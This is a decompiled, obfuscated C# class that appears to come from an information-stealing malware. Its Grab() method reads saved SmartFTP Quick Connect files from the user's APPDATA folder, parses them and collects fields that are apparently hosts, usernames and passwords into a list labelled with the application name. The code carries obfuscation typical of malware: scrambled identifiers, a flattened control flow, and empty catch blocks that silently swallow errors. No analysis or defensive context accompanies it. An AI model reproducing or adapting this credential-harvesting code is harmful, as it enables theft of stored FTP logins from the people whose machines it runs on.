using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters.Binary;
using F3k8m0yephw;
using p3N5Y;

namespace ZAZUx;

public class qhlcUI0yH : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string REiZP
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public qhlcUI0yH()
	{
		REiZP = "SmartFTP";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			switch (num)
			{
			case 2:
				try
				{
					string path = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), "SmartFTP\\Client 2.0\\Favorites\\Quick Connect");
					if (!Directory.Exists(path))
					{
						return list;
					}
					string[] files = Directory.GetFiles(path);
					new BinaryFormatter();
					string[] array = files;
					foreach (string path2 in array)
					{
						try
						{
							_9noGuOuV3Y obj = _9noGuOuV3Y.AsGUBGQz4o(File.ReadAllBytes(path2));
							ii68 ii69 = new ii68();
							foreach (T0ipHAo item in obj._4SAZp8IZ)
							{
								try
								{
									switch (((pCdkn)item).YwSazqTq9)
									{
									case 3u:
										ii69.byIdLuuGZbL = (string)item.Nm7ch.It56X1O;
										break;
									case 12u:
										ii69.S8v = (string)item.Nm7ch.It56X1O;
										break;
									case 13u:
										ii69._9H5rP7hg2 = (string)item.Nm7ch.It56X1O;
										break;
									}
								}
								catch
								{
								}
							}
							if (ii69 != null)
							{
								ii69.oVAe = REiZP;
								list.Add(ii69);
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				return list;
			case 0:
				num = 1;
				break;
			}
		}
		while (num != 3);
		List<ii68> result = default;
		return result;
	}
}
